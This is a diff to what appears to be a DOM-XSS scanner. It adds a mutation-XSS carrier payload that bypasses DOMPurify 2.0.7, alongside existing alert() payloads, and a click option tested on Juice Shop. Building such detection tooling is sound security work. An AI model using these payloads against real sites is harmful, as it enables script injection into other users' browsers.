@@ -1061,6 +1061,13 @@ _CARRIER_SHAPES = (
     ("html", "<img src=x onerror=alert(%d)>"),
     ("js", "alert(%d)"),
     ("url", "javascript:alert(%d)"),
+    # Phase 265: range6 measured this form/math/mglyph namespace-confusion
+    # shape survives DOMPurify 2.0.7 and is stripped by 3.4.17.  The generic
+    # html/js/url carriers cannot get through either build, so without this
+    # shape a KNOWN-vulnerable sanitizer page could only ever earn a low
+    # delivery hint.  The page's own dialog is still the proof.
+    ("mxss", "<form><math><mtext></form><form><mglyph><style></math>"
+             "<img src onerror=alert(%d)>"),
 )
 
 # Phase 226: cap on carrier-wave navigations per analyze() call.  Wave 1 is
@@ -1790,7 +1797,8 @@ class DynamicDomAnalyzer:
         return False, ""
 
     def analyze(self, url: str, marker: str | None = None,
-                dialog_token: str | None = None) -> list:
+                dialog_token: str | None = None,
+                click_selector: str | None = None) -> list:
         """Render ``url`` in the instrumented browser and report sink hits.
 
         ``dialog_token`` (Phase 194, stored-XSS closure): when set, a
@@ -1869,6 +1877,11 @@ class DynamicDomAnalyzer:
                 # PM carrier wave runs at most once per analyze() call.
                 carrier_waves = 0
                 pm_wave_done = False
+                # Phase 282: a view that renders its stored value only
+                # AFTER an interaction (a product-details dialog, a drawer,
+                # an accordion row).  The click runs once, right after the
+                # first navigation, so later probes observe the open state.
+                clicked = False
                 for probe in self._probes(url, marker):
                     if time.monotonic() > deadline:
                         _log.debug(
@@ -1895,6 +1908,22 @@ class DynamicDomAnalyzer:
                             self._bounded_goto(page, probe["url"], deadline)
                             # Let the route render (see _DOM_SETTLE_MS).
                             page.wait_for_timeout(_DOM_SETTLE_MS)
+                            if click_selector and not clicked:
+                                clicked = True
+                                try:
+                                    # Phase 282: click the FIRST match.  A
+                                    # selector like `mat-card` matches every
+                                    # result card, and Playwright's strict
+                                    # mode then refuses the click outright --
+                                    # the view never opens and the stored
+                                    # value is never rendered.  Measured on
+                                    # Juice Shop's search page (15 cards).
+                                    page.locator(click_selector).first.click(
+                                        timeout=5000)
+                                    page.wait_for_timeout(_DOM_SETTLE_MS)
+                                except Exception:
+                                    _log.debug("dom: view click %r failed",
+                                               click_selector)
                         elif probe["kind"] == "cookie":
                             page.context.add_cookies(
                                 [{"name": "__xss__", "value": marker,
@@ -2090,7 +2119,8 @@ class DynamicDomAnalyzer:
                                 f"'{src}' reached sink "
                                 f"'{sink}', but no execution was observed "
                                 f"in this browser (carrier shapes tried: "
-                                f"html/js/url).  Delivery evidence only -- "
+                                f"{', '.join(name for name, _ in _CARRIER_SHAPES)}). "
+                                f"Delivery evidence only -- "
                                 f"not proof of absence.")
                         findings.append({
                             "type": "dom_dynamic",
